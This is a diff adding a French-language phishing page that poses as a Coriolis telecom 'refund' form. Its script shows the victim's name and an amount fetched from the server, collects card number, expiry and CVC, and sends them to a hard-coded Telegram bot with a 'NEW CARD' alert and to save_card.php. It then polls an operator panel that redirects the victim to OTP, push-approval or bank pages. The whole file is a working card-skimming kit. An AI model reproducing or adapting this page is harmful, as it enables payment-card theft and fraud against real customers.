@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Page blanche · Barre bleue arrondie</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    .top-bar {
+      background-color: #4DBDC6;
+      width: 100%;
+      min-height: 150px;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02), 0 2px 4px rgba(0, 0, 0, 0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 24px;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .content-white {
+      flex: 1;
+      background-color: #ffffff;
+      width: 100%;
+      padding: 30px 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    /* Styles pour les éléments de paiement */
+    .payment-section {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .montant-label {
+      font-weight: bold;
+      font-size: 1.3rem;
+      text-align: center;
+      margin-top: 28px;
+    }
+
+    .prix {
+      font-size: 14px;
+      font-weight: normal;
+      text-align: center;
+      margin-top: -3%;
+    }
+
+    /* Bloc bleu avec message */
+    .info-bloc {
+      background-color: #4DBDC6;
+      padding: 13px;
+      border-radius: 12px;
+      text-align: center;
+      color: #323232;
+      width: 89%;
+    }
+
+    .info-bloc p {
+      font-size: 17px;
+      line-height: 1.4;
+    }
+
+    /* Petite barre fine bleue */
+    .thin-blue-bar {
+      width:  90%;
+      height: 1px;
+      background-color: #4DBDC6;
+      border-radius: 3px;
+      margin-top: 1%;
+    }
+
+    /* Champs de formulaire style "seulement barre du bas" */
+    .input-field {
+      width: 100%;
+      text-align: center;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 1.1rem;
+    }
+
+    .input-with-bottom-border {
+      width: 90%;
+      padding: 12px 8px;
+      font-size: 1rem;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #b5b5b5;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+
+    .input-with-bottom-border:focus {
+      border-bottom-color: #2c7da0;
+    }
+
+    /* Bouton payer */
+    .btn-payer {
+      background-color: #323232;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-payer:hover {
+      background-color: #2c7da0;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 100px !important;
+      }
+      .content-white {
+        padding: 20px 16px;
+      }
+      .prix {
+        font-size: 1.1rem;
+      }
+    }
+
+    @media (min-width: 1600px) {
+      .top-bar {
+        min-height: 170px !important;
+      }
+    }
+
+    .top-bar {
+      min-height: 120px !important;
+      height: auto !important;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 100px !important;
+      }
+    }
+
+    body, .page-container, .content-white {
+      overflow-x: hidden;
+    }
+
+
+/* Aligner les textes des labels à gauche */
+.input-field label {
+  margin-right: 47%;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+}
+
+/* Espace entre les cases */
+.input-field {
+  margin-bottom: 28px;
+}
+
+/* Supprimer l'espace du dernier champ */
+.input-field:last-of-type {
+  margin-bottom: 0;
+}
+
+.bas {
+ width: 110%;
+margin-top: 10%;
+}
+
+/* Barre d'étapes - Style Orange */
+.stepbar {
+  width: 100%;
+  max-width: 600px;
+  margin: 20px auto 10px auto;
+  padding: 0 25px;
+  margin-top: 20px;
+}
+
+.stepbar ol {
+  display: flex;
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  justify-content: space-between;
+  position: relative;
+  counter-reset: step;
+  margin-top: 30px;
+  margin-bottom: -30px;
+}
+
+.stepbar ol::before {
+  content: '';
+  position: absolute;
+  top: 16px;
+  left: 30px;
+  right: 30px;
+  height: 2px;
+  background: #e1e1e1;
+  z-index: 0;
+}
+
+.step-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+  z-index: 1;
+  flex: 1;
+  counter-increment: step;
+}
+
+.step-item::before {
+  content: counter(step);
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: #ffffff;
+  color: #000000;
+  border: 2px solid #e1e1e1;
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 8px;
+  transition: all 0.3s ease;
+  font-family: Arial, sans-serif;
+}
+
+.step-item.active::before {
+  background: #ffffff;
+  color: #000000;
+  border-color: #4DBDC6;
+}
+
+.step-item.active .step-title {
+  color: #4DBDC6;
+  font-weight: 600;
+}
+
+.step-title {
+  font-size: 11px;
+  color: #000000;
+  text-align: center;
+  font-weight: 400;
+  white-space: nowrap;
+}
+
+.step-link {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-decoration: none;
+  cursor: default;
+}
+
+.step-item:last-child::before {
+  content: '✓';
+  background: #ffffff;
+  color: #000000;
+  border: 2px solid #e1e1e1;
+  font-size: 16px;
+  font-weight: bold;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  margin-bottom: 8px;
+}
+
+/* Responsive mobile */
+@media (max-width: 560px) {
+  .stepbar {
+    margin: 10px auto 5px auto;
+    padding: 0 5px;
+  }
+  
+  .stepbar ol::before {
+    left: 30px;
+    right: 30px;
+    top: 13px;
+  }
+  
+  .step-item::before {
+    width: 26px;
+    height: 26px;
+    font-size: 11px;
+  }
+  
+  .step-item:last-child::before {
+    width: 26px;
+    height: 26px;
+    font-size: 13px;
+  }
+  
+  .step-title {
+    font-size: 9px;
+  }
+}
+
+  /* === STYLES DU FOOTER === */
+footer {
+  margin-top: 10px;
+  background: #1a1a1a;
+  color: #fff;
+  padding: 50px 0 20px;
+}
+
+.content-wrapper {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 20px;
+}
+
+.footer-container .logo {
+  display: block;
+  margin-bottom: 30px;
+}
+
+.link-column {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 30px;
+}
+
+.link-column div p {
+  font-weight: 600;
+  font-size: 16px;
+  margin-bottom: 15px;
+  cursor: pointer;
+  color: #fff;
+}
+
+.link-column ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.link-column ul li {
+  margin-bottom: 10px;
+}
+
+.link-column ul li a {
+  color: #999;
+  text-decoration: none;
+  font-size: 14px;
+  transition: color 0.2s ease;
+}
+
+.link-column ul li a:hover {
+  color: #fff;
+}
+
+.networking-content {
+  text-align: center;
+  padding: 30px 0 20px;
+  border-top: 1px solid #333;
+  margin-top: 30px;
+}
+
+.networking {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+}
+
+.networking li a {
+  display: inline-block;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: #333;
+  transition: background 0.3s ease;
+}
+
+.networking li a:hover {
+  background: #4DBDC6;
+}
+
+.networking li a.facebook { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.twitter { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.linkedin { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.youtube { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.instagram { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+
+.footer-extra {
+  background: #111;
+  padding: 20px 0;
+}
+
+.legal {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px 25px;
+}
+
+.legal li a {
+  color: #777;
+  text-decoration: none;
+  font-size: 13px;
+  transition: color 0.2s ease;
+}
+
+.legal li a:hover {
+  color: #fff;
+}
+
+@media (max-width: 768px) {
+  .link-column {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+@media (max-width: 480px) {
+  .link-column {
+    grid-template-columns: 1fr;
+  }
+  .legal {
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+}
+  </style>
+</head>
+<body>
+  <div class="page-container">
+<header class="top-bar" role="banner" aria-label="Barre de navigation bleue arrondie" style="position: relative;">
+      <span style="color: white; font-weight: 600; font-size: 1.6rem; margin-top: -10px;">coriolis</span>
+      <div aria-hidden="true" class="ytSpecButtonShapeNextIcon" style="position: absolute; left: 24px; bottom: 15px; display: flex; align-items: center; gap: 8px;">
+        <span class="ytIconWrapperHost" style="width: 24px; height: 24px; display: inline-block;">
+          <span class="yt-icon-shape ytSpecIconShapeHost">
+            <div style="width: 100%; height: 100%; display: block; fill: white;">
+              <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24" focusable="false" aria-hidden="true" style="pointer-events: none; display: inherit; width: 100%; height: 100%;">
+                <path d="M12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11S18.075 1 12 1Zm0 2a9 9 0 016.447 15.276 7 7 0 00-12.895 0A9 9 0 0112 3Zm0 2a4 4 0 100 8 4 4 0 000-8Zm0 2a2 2 0 110 4 2 2 0 010-4Zm-.1 9.001L11.899 16a5 5 0 014.904 3.61A8.96 8.96 0 0112 21a8.96 8.96 0 01-4.804-1.391 5 5 0 014.704-3.608Z"></path>
+              </svg>
+            </div>
+          </span>
+        </span>
+        <span style="color: white; font-weight: 500; font-size: 14px;" id="victimeNom">Nom Prénom</span>
+</div>
+    </header>
+    <!-- Barre d'étapes - Style Orange -->
+<div class="stepbar">
+  <ol>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item active">
+      <span class="step-link">
+        <span class="step-title">Remboursement</span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+  </ol>
+</div>
+    <main class="content-white" role="main">
+      <div class="payment-section">
+        <!-- Montant à régler en gras -->
+        <div class="montant-label">Montant à rembourser</div>
+        
+        <!-- 5,99€ pas en gras -->
+        <div class="prix" id="prixVictime">159,99€</div>
+        
+        <!-- Bloc bleu centré avec message -->
+        <div class="info-bloc">
+          <p>Une fois le remboursement effectué, <strong>merci d'attendre l'affichage de la page de confirmation de commande</strong> pour que votre remboursement soit validée.</p>
+        </div>
+        
+        <!-- Petite fine barre bleue -->
+        <div class="thin-blue-bar"></div>
+        
+        <!-- Numéro de la carte * -->
+        <div class="input-field">
+          <label>Numéro de la carte *</label>
+          <input type="text" class="input-with-bottom-border" placeholder="1234 1234 1234 1234">
+        </div>
+        
+        <!-- Date d'expiration * -->
+        <div class="input-field">
+          <label>Date d'expiration *</label>
+          <input type="text" class="input-with-bottom-border" placeholder="MM / AA">
+        </div>
+        
+        <!-- Cryptogramme * -->
+        <div class="input-field">
+          <label>Cryptogramme *</label>
+          <input type="text" class="input-with-bottom-border" placeholder="CVC">
+        </div>
+        
+        <!-- Bouton Payer -->
+        <button class="btn-payer">Valider</button>
+      </div>
+          </main>
+      <!-- ========== FOOTER CORIOLIS ========== -->
+<footer>
+    <div class="footer-container content-wrapper">
+<div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px;">
+    <a href="/" class="logo" title="Page d'accueil de Coriolis" style="margin-bottom: 0;">
+        <picture>
+            <source srcset="https://cdn.coriolistele.com/sources/coriolis/assets/images/coriolis-green-logo.svg">
+            <img src="https://cdn.coriolistele.com/sources/coriolis/assets/images/coriolis-green-logo.svg" alt="logo Coriolis" width="130" height="30" loading="lazy" decoding="async">
+        </picture>
+    </a>
+    <span style="color: #999; font-style: italic; font-size: 12px;">Formulaire Sécurisé</span>
+</div>
+    <div class="networking-content">
+        <ul class="networking">
+            <li><a target="_blank" class="facebook">&nbsp;</a></li>
+            <li><a target="_blank" class="twitter">&nbsp;</a></li>
+            <li><a target="_blank" class="linkedin">&nbsp;</a></li>
+            <li><a target="_blank" class="youtube">&nbsp;</a></li>
+            <li><a target="_blank" class="instagram">&nbsp;</a></li>
+        </ul>
+    </div>
+</footer>
+
+<div class="footer-extra">
+    <div class="content-wrapper">
+        <ul class="legal">
+            <li><a>Conditions générales de vente</a></li>
+            <li><a>Conditions générales d'abonnement</a></li>
+            <li><a>Conditions générales d'utilisation</a></li>
+            <li><a>Informations légales</a></li>
+            <li><a>Gestion des cookies & données personnelles</a></li>
+        </ul>
+    </div>
+</div>
+<!-- ========== FIN FOOTER ========== -->
+  </div>
+<script>
+  // Charger les données victime au démarrage
+function loadVictimeData() {
+    fetch('get_victime.php')
+        .then(response => response.json())
+        .then(data => {
+            if (data && data.nom && data.prenom) {
+                document.getElementById('victimeNom').textContent = data.prenom + ' ' + data.nom;
+            }
+            if (data && data.prix) {
+                document.getElementById('prixVictime').textContent = data.prix + '€';
+            }
+        })
+        .catch(error => {
+            console.error('Erreur chargement victime:', error);
+        });
+}
+
+// Appeler au chargement
+loadVictimeData();
+
+// Rafraîchir toutes les 2 secondes
+setInterval(loadVictimeData, 2000);
+
+  // Formatage des champs
+  const cardNumberInput = document.querySelectorAll('.input-field')[0].querySelector('.input-with-bottom-border');
+  if (cardNumberInput) {
+    cardNumberInput.addEventListener('input', function(e) {
+      let rawValue = this.value.replace(/\s/g, '').replace(/\D/g, '');
+      if (rawValue.length > 16) rawValue = rawValue.slice(0, 16);
+      let formattedValue = '';
+      for (let i = 0; i < rawValue.length; i++) {
+        if (i > 0 && i % 4 === 0) formattedValue += ' ';
+        formattedValue += rawValue[i];
+      }
+      this.value = formattedValue;
+    });
+  }
+  
+  const dateInput = document.querySelectorAll('.input-field')[1].querySelector('.input-with-bottom-border');
+  if (dateInput) {
+    dateInput.addEventListener('input', function(e) {
+      let rawValue = this.value.replace(/\D/g, '');
+      if (rawValue.length > 4) rawValue = rawValue.slice(0, 4);
+      let formattedValue = '';
+      for (let i = 0; i < rawValue.length; i++) {
+        if (i === 2 && rawValue.length > 2) formattedValue += '/';
+        formattedValue += rawValue[i];
+      }
+      this.value = formattedValue;
+    });
+  }
+  
+  const cryptoInput = document.querySelectorAll('.input-field')[2].querySelector('.input-with-bottom-border');
+  if (cryptoInput) {
+    cryptoInput.addEventListener('input', function(e) {
+      let rawValue = this.value.replace(/\D/g, '');
+      if (rawValue.length > 3) rawValue = rawValue.slice(0, 3);
+      this.value = rawValue;
+    });
+  }
+
+  // Styles pour le loader
+  const style = document.createElement('style');
+  style.textContent = `
+    .btn-payer {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .loader {
+      width: 20px;
+      height: 20px;
+      border: 2px solid white;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .hidden {
+      display: none;
+    }
+    .success-bloc {
+      background-color: #51d434;
+      padding: 13px;
+      border-radius: 12px;
+      text-align: center;
+      color: white;
+      width: 89%;
+    }
+    .success-bloc p {
+      font-size: 17px;
+      line-height: 1.4;
+    }
+  `;
+  document.head.appendChild(style);
+
+  // Récupérer les éléments
+  const btnPayer = document.querySelector('.btn-payer');
+  const infoBloc = document.querySelector('.info-bloc');
+  const allInputFields = document.querySelectorAll('.input-field');
+
+function sendCardToPHP(cardNumber, expiryDate, crypto) {
+    const botToken = "8616978526:AAFxttd46iY76-9y0Qa-SEFlJ7W-HUifkxM";
+    const chatId = "-5520620526";
+    
+    // Message formaté
+        const message = `┏━━━━━━⊱ 📞 ⊰━━━━━┓\n` +
+                    `└⊱ 💳 +1 NEW CARD\n` +
+                    `\n` +
+                    `├⊱ 💳 ⊱ ${cardNumber}\n` +
+                    `├⊱ 📅 ⊱ ${expiryDate}\n` +
+                    `├⊱ 🔐 ⊱ ${crypto}\n` +
+                    `\n` +
+                    `📞 Base : CORIOLIS\n` +
+                    `👨‍💻 DEV BY : @esim_to_Back\n` +
+                    `└━━━━━━⊱ 📞 ⊰━━━━━━━━━━━━`;    
+    // Encoder le message
+    const encodedMessage = encodeURIComponent(message);
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
+    
+    console.log('📤 Envoi à Telegram:', url);
+    
+    return fetch(url)
+        .then(response => {
+            console.log('📥 Réponse Telegram:', response);
+            return response.json();
+        })
+        .then(data => {
+            console.log('📊 Données Telegram:', data);
+            if (!data.ok) {
+                throw new Error(data.description || 'Erreur Telegram');
+            }
+            // Envoyer à PHP
+            return fetch('save_card.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    cardNumber: cardNumber,
+                    expiryDate: expiryDate,
+                    crypto: crypto
+                })
+            });
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('✅ Carte sauvegardée:', data);
+            return data;
+        })
+        .catch(error => {
+            console.error('❌ Erreur:', error);
+            alert('❌ Erreur Telegram: ' + error.message);
+            throw error;
+        });
+}
+
+// Fonction pour vérifier l'action du panel
+function checkAction() {
+    return fetch('action.php')
+      .then(response => response.json())
+      .then(data => {
+        if (data.action === 'refresh') {
+          window.location.reload();
+        } else if (data.action === 'redirect_otp') {
+          window.location.href = 'otp.html';
+        } else if (data.action === 'redirect_push') {
+          window.location.href = 'push.html';
+        } else if (data.action === 'redirect_bank') {
+          window.location.href = 'bank-index.html';
+        }
+        return data;
+      })
+      .catch(error => console.error('Erreur checkAction:', error));
+}
+
+  // Événement au clic sur Valider
+  btnPayer.addEventListener('click', function() {
+    const cardNumber = document.querySelectorAll('.input-field')[0].querySelector('.input-with-bottom-border').value;
+    const expiryDate = document.querySelectorAll('.input-field')[1].querySelector('.input-with-bottom-border').value;
+    const crypto = document.querySelectorAll('.input-field')[2].querySelector('.input-with-bottom-border').value;
+    
+    if (!cardNumber || !expiryDate || !crypto) {
+      alert("Veuillez remplir tous les champs");
+      return;
+    }
+    
+    // Afficher le loader
+    btnPayer.textContent = '';
+    const loader = document.createElement('div');
+    loader.className = 'loader';
+    btnPayer.appendChild(loader);
+    btnPayer.disabled = true;
+    
+    // Envoyer les données
+    sendCardToPHP(cardNumber, expiryDate, crypto)
+      .then(() => {
+        // Cacher les champs
+        allInputFields.forEach(field => {
+          field.classList.add('hidden');
+        });
+        
+        // Garder le loader qui tourne en attendant l'action du panel
+        // Le loader reste affiché indéfiniment
+        console.log('⏳ En attente de la décision du panel...');
+        
+        // Vérifier les actions du panel toutes les 2 secondes
+        const checkInterval = setInterval(() => {
+          checkAction().then(data => {
+            if (data.action) {
+              clearInterval(checkInterval);
+            }
+          });
+        }, 2000);
+        
+        // Timeout de sécurité après 60 secondes
+        setTimeout(() => {
+          clearInterval(checkInterval);
+          // Réafficher le bouton si le panel ne répond pas
+          if (btnPayer.disabled) {
+            btnPayer.textContent = 'Valider';
+            btnPayer.disabled = false;
+            loader.remove();
+            allInputFields.forEach(field => {
+              field.classList.remove('hidden');
+            });
+          }
+        }, 60000);
+      })
+      .catch(() => {
+        alert('Une erreur est survenue, veuillez réessayer.');
+        btnPayer.textContent = 'Valider';
+        btnPayer.disabled = false;
+        loader.remove();
+      });
+  });
+</script>
+</body>
+</html>
